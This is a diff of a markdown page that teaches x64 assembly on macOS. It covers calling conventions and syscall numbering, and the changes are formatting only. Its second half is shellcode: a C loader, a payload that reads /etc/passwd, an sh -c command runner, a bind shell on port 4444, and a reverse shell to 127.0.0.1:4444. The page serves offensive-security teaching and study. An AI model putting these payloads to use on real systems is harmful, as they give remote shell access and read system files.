@@ -1,6 +1,5 @@
 # Introduction to x64
 
-
 ## **Introduction to x64**
 
 x64, also known as x86-64, is a 64-bit processor architecture predominantly used in desktop and server computing. Originating from the x86 architecture produced by Intel and later adopted by AMD with the name AMD64, it's the prevalent architecture in personal computers and servers today.
@@ -29,7 +28,7 @@ If the function has more than six inputs, the **rest will be passed on the stack
 
 ### Calling Convention in Swift
 
-Swift have its own **calling convention** that can be found in [[https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64|**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**]]
+Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
 
 ### **Common Instructions**
 
@@ -68,7 +67,7 @@ x64 instructions have a rich set, maintaining compatibility with earlier x86 ins
 
 ### syscalls
 
-There are different classes of syscalls, you can [[https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h|**find them here**]]**:**
+There are different classes of syscalls, you can [**find them here**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
 
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
@@ -78,8 +77,8 @@ There are different classes of syscalls, you can [[https://opensource.apple.com/
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-```
-Then, you can find each syscall number [[https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master|**in this url**]]**:**
+
+Then, you can find each syscall number [**in this url**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
@@ -97,7 +96,7 @@ Then, you can find each syscall number [[https://opensource.apple.com/source/xnu
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-```
+
 So in order to call the `open` syscall (**5**) from the **Unix/BSD class** you need to add it: `0x2000000`
 
 So, the syscall number to call open would be `0x2000005`
@@ -110,7 +109,7 @@ To compile:
 nasm -f macho64 shell.asm -o shell.o
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
 ```
-```
+
 To extract the bytes:
 
 ```bash
@@ -122,10 +121,10 @@ done
 # Another option
 otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
 ```
-```
+
+<details>
 
 **C code to test the shellcode**
-
 
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
@@ -172,11 +171,12 @@ int main(int argc, char **argv) {
     return 0;
 }
 ```
-```
+
+</details>
 
 #### Shell
 
-Taken from [[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s|**here**]] and explained.
+Taken from [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) and explained.
 
 **with adr**
 
@@ -193,7 +193,6 @@ r_cmd64:                      ; the call placed a pointer to db (argv[2])
     pop     rax               ; pop it to RAX
     bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
     syscall
-```
 ```
 
 **with stack**
@@ -213,8 +212,6 @@ _main:
     bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
     syscall
 ```
-```
-
 
 #### Read with cat
 
@@ -227,7 +224,7 @@ global _main
 
 _main:
     ; Prepare the arguments for the execve syscall
-    sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48
+    sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`
 
     lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
     lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"
@@ -250,7 +247,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-```
+
 #### Invoke command with sh
 
 ```armasm
@@ -290,10 +287,10 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-```
+
 #### Bind shell
 
-Bind shell from [[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html|https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html]] in **port 4444**
+Bind shell from [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **port 4444**
 
 ```armasm
 section .text
@@ -369,10 +366,10 @@ dup2:
     mov  al, 0x3b
     syscall
 ```
-```
+
 #### Reverse Shell
 
-Reverse shell from [[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html|https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html]]. Reverse shell to **127.0.0.1:4444**
+Reverse shell from [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell to **127.0.0.1:4444**
 
 ```armasm
 section .text
@@ -435,7 +432,4 @@ dup2:
     mov  al, 0x3b
     syscall
 ```
-```
-
-
 
